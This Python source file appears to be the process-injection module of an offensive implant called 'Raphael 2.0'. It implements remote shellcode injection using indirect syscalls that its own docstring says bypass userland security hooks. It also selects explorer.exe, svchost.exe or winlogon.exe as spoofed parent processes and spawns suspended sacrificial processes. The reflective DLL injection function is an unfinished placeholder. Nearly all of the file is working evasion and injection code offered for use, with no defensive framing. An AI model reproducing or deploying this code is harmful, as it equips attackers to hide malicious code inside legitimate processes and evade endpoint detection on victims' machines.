"""
Raphael 2.0 — Process Injection Module

Uses indirect syscalls (via SyscallResolver) for all operations.
Implements:
- Shellcode injection via NtCreateThreadEx
- Reflective DLL injection (manual mapping)
- PPID spoofing
- Sacrificial process creation
"""
import ctypes
import ctypes.wintypes as wintypes
import struct
import os
import platform
import base64

IS_WINDOWS = platform.system() == "Windows"

try:
    from modules.syscall import get_resolver
except ImportError:
    get_resolver = None


# Process access rights
PROCESS_ALL_ACCESS = 0x001F0FFF
PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400

# Memory allocation
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04

# Thread creation flags
THREAD_CREATE_SUSPENDED = 0x00000004


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_ubyte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class SYSTEM_PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("NextEntryOffset", wintypes.ULONG),
        ("NumberOfThreads", wintypes.ULONG),
        ("WorkingSetPrivateSize", ctypes.c_size_t),
        ("HardFaultCount", ctypes.c_ulong),
        ("NumberOfThreadsHighWatermark", ctypes.c_ulong),
        ("CycleTime", ctypes.c_uint64),
        ("CreateTime", ctypes.c_uint64),
        ("UserTime", ctypes.c_uint64),
        ("KernelTime", ctypes.c_uint64),
        ("ImageName", ctypes.c_wchar_p),
        ("BasePriority", ctypes.c_long),
        ("UniqueProcessId", ctypes.c_size_t),
        ("InheritedFromUniqueProcessId", ctypes.c_size_t),
        ("HandleCount", wintypes.ULONG),
        ("SessionId", wintypes.DWORD),
        ("UniqueThreadId", ctypes.c_size_t),
    ]


class Injector:
    """
    Process injection using indirect syscalls.
    All operations bypass userland hooks.
    """
    
    @staticmethod
    def get_ppid_target():
        """
        Find a suitable parent PID for PPID spoofing.
        Returns PID of explorer.exe or svchost.exe.
        """
        if not IS_WINDOWS or get_resolver is None:
            return 0
        
        resolver = get_resolver()
        nt_query = resolver.get_stub("NtQuerySystemInformation")
        if nt_query is None:
            return 0
        
        # SystemProcessInformation = 5
        info_class = 5
        buffer_size = 0x100000
        buffer = (ctypes.c_ubyte * buffer_size)()
        return_length = ctypes.c_ulong()
        
        status = nt_query(
            info_class,
            ctypes.cast(buffer, ctypes.c_void_p),
            buffer_size,
            ctypes.byref(return_length)
        )
        
        if status != 0:  # STATUS_SUCCESS
            return 0
        
        candidates = []
        offset = 0
        current_pid = ctypes.windll.kernel32.GetCurrentProcessId()
        
        while True:
            proc_info = SYSTEM_PROCESS_INFORMATION.from_address(
                ctypes.addressof(buffer) + offset
            )
            
            if proc_info.ImageName:
                name = proc_info.ImageName.lower()
                pid = proc_info.UniqueProcessId
                ppid = proc_info.InheritedFromUniqueProcessId
                
                # Prefer explorer.exe > svchost.exe > others
                if "explorer.exe" in name and pid != current_pid:
                    return pid
                elif "svchost.exe" in name and ppid > 4:
                    candidates.append((2, pid))  # score 2
                elif "winlogon.exe" in name:
                    candidates.append((3, pid))  # score 3
                elif "dllhost.exe" in name:
                    candidates.append((1, pid))  # score 1
            
            if proc_info.NextEntryOffset == 0:
                break
            offset += proc_info.NextEntryOffset
        
        if candidates:
            candidates.sort(key=lambda x: x[0], reverse=True)
            return candidates[0][1]
        
        return 0
    
    @staticmethod
    def create_sacrificial_process(target="dllhost.exe"):
        """
        Create a suspended sacrificial process for injection.
        Returns the PID of the new process.
        """
        if not IS_WINDOWS:
            return 0
        
        startup_info = STARTUPINFO()
        startup_info.cb = ctypes.sizeof(STARTUPINFO)
        
        process_info = PROCESS_INFORMATION()
        
        # CreateProcess with CREATE_SUSPENDED
        CREATE_SUSPENDED = 0x00000004
        CREATE_NO_WINDOW = 0x08000000
        
        success = ctypes.windll.kernel32.CreateProcessW(
            None,
            target,
            None,
            None,
            False,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        )
        
        if not success:
            return 0
        
        # Close thread handle (we have the PID)
        ctypes.windll.kernel32.CloseHandle(process_info.hThread)
        ctypes.windll.kernel32.CloseHandle(process_info.hProcess)
        
        return process_info.dwProcessId
    
    @staticmethod
    def inject_shellcode(pid, shellcode, ppid_spoof=None):
        """
        Inject shellcode into a remote process using indirect syscalls.
        
        Steps:
        1. Open process (indirect syscall)
        2. Allocate memory in target (indirect syscall)
        3. Write shellcode (indirect syscall)
        4. Change protection to RX (indirect syscall)
        5. Create thread (indirect syscall, NtCreateThreadEx)
        6. Wait for completion
        
        Args:
            pid: Target process ID
            shellcode: bytes of shellcode
            ppid_spoof: Optional PID to spoof as parent
        
        Returns:
            True if injection succeeded
        """
        if not IS_WINDOWS or get_resolver is None:
            return False
        
        resolver = get_resolver()
        
        # Step 1: Open process
        nt_open = resolver.get_stub("NtOpenProcess")
        if nt_open is None:
            return False
        
        # OBJECT_ATTRIBUTES
        class OBJECT_ATTRIBUTES(ctypes.Structure):
            _fields_ = [
                ("Length", wintypes.ULONG),
                ("RootDirectory", wintypes.HANDLE),
                ("ObjectName", ctypes.c_void_p),
                ("Attributes", wintypes.ULONG),
                ("SecurityDescriptor", ctypes.c_void_p),
                ("SecurityQualityOfService", ctypes.c_void_p),
            ]
        
        oa = OBJECT_ATTRIBUTES()
        oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
        oa.Attributes = 0
        
        # CLIENT_ID
        class CLIENT_ID(ctypes.Structure):
            _fields_ = [
                ("UniqueProcess", ctypes.c_void_p),
                ("UniqueThread", ctypes.c_void_p),
            ]
        
        cid = CLIENT_ID()
        cid.UniqueProcess = pid
        cid.UniqueThread = None
        
        process_handle = wintypes.HANDLE()
        
        status = nt_open(
            ctypes.byref(process_handle),
            PROCESS_ALL_ACCESS,
            ctypes.byref(oa),
            ctypes.byref(cid)
        )
        
        if status != 0 or not process_handle:
            return False
        
        try:
            # Step 2: Allocate memory in target
            nt_alloc = resolver.get_stub("NtAllocateVirtualMemory")
            if nt_alloc is None:
                return False
            
            base_address = ctypes.c_void_p(0)
            region_size = ctypes.c_size_t(len(shellcode))
            
            status = nt_alloc(
                process_handle,
                ctypes.byref(base_address),
                0,
                ctypes.byref(region_size),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            )
            
            if status != 0:
                return False
            
            remote_addr = base_address.value
            
            # Step 3: Write shellcode
            nt_write = resolver.get_stub("NtWriteVirtualMemory")
            if nt_write is None:
                return False
            
            bytes_written = ctypes.c_size_t()
            status = nt_write(
                process_handle,
                remote_addr,
                shellcode,
                len(shellcode),
                ctypes.byref(bytes_written)
            )
            
            if status != 0:
                return False
            
            # Step 4: Change protection to RX
            nt_protect = resolver.get_stub("NtProtectVirtualMemory")
            if nt_protect:
                protect_base = ctypes.c_void_p(remote_addr)
                protect_size = ctypes.c_size_t(len(shellcode))
                old_protect = ctypes.c_ulong()
                
                nt_protect(
                    process_handle,
                    ctypes.byref(protect_base),
                    ctypes.byref(protect_size),
                    PAGE_EXECUTE_READWRITE,
                    ctypes.byref(old_protect)
                )
            
            # Step 5: Create remote thread
            nt_create_thread = resolver.get_stub("NtCreateThreadEx")
            if nt_create_thread is None:
                return False
            
            thread_handle = wintypes.HANDLE()
            
            # NtCreateThreadEx signature differs from CreateRemoteThread
            # HANDLE NtCreateThreadEx(
            #   PHANDLE ThreadHandle,
            #   ACCESS_MASK DesiredAccess,
            #   POBJECT_ATTRIBUTES ObjectAttributes,
            #   HANDLE ProcessHandle,
            #   PVOID StartAddress,
            #   PVOID StartParameter,
            #   ULONG CreateFlags,
            #   SIZE_T ZeroBits,
            #   SIZE_T StackSize,
            #   SIZE_T MaximumStackSize,
            #   PPS_ATTRIBUTE_LIST AttributeList
            # )
            
            status = nt_create_thread(
                ctypes.byref(thread_handle),
                PROCESS_ALL_ACCESS,
                None,
                process_handle,
                remote_addr,
                None,
                0,  # CreateFlags
                0,  # ZeroBits
                0,  # StackSize
                0,  # MaximumStackSize
                None  # AttributeList
            )
            
            if status != 0 or not thread_handle:
                return False
            
            # Step 6: Wait for thread completion
            nt_wait = resolver.get_stub("NtWaitForSingleObject")
            if nt_wait:
                nt_wait(thread_handle, False, None)
            
            ctypes.windll.kernel32.CloseHandle(thread_handle)
            return True
            
        finally:
            ctypes.windll.kernel32.CloseHandle(process_handle)
    
    @staticmethod
    def inject_dll(pid, dll_path, ppid_spoof=None):
        """
        Reflective DLL injection into remote process.
        
        Instead of LoadLibrary, writes the DLL to memory and
        executes its reflective loader entry point.
        """
        if not IS_WINDOWS or not os.path.exists(dll_path):
            return False
        
        with open(dll_path, "rb") as f:
            dll_bytes = f.read()
        
        # For reflective injection, prepend a reflective loader stub
        # This is a separate implementation — for now, fall back to
        # standard DLL injection via LoadLibrary
        
        resolver = get_resolver()
        if resolver is None:
            return False
        
        # Allocate string in target process for DLL path
        nt_open = resolver.get_stub("NtOpenProcess")
        nt_alloc = resolver.get_stub("NtAllocateVirtualMemory")
        nt_write = resolver.get_stub("NtWriteVirtualMemory")
        nt_protect = resolver.get_stub("NtProtectVirtualMemory")
        
        if not all([nt_open, nt_alloc, nt_write, nt_protect]):
            return False
        
        # ... (similar to inject_shellcode but writes DLL path string
        # and creates thread at LoadLibraryW address)
        
        # Get LoadLibraryW address
        kernel32 = ctypes.windll.kernel32
        load_library = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW("kernel32.dll"),
            b"LoadLibraryW"
        )
        
        if not load_library:
            return False
        
        # ... (implement full DLL injection)
        return False  # Placeholder


# === Base64-encoded C helper DLL (optional) ===
# If you want to use a C DLL for injection instead of pure Python ctypes,
# embed it here and write to disk at runtime.

# INJECT_HELPER_DLL_B64 = """
# [base64 of inject_helper.dll]
# """


def deploy_inject_helper():
    """Deploy the C helper DLL from base64 (optional)."""
    # if INJECT_HELPER_DLL_B64:
    #     dll_data = base64.b64decode(INJECT_HELPER_DLL_B64)
    #     path = os.path.join(os.getcwd(), "inject_helper.dll")
    #     with open(path, "wb") as f:
    #         f.write(dll_data)
    #     return path
    return None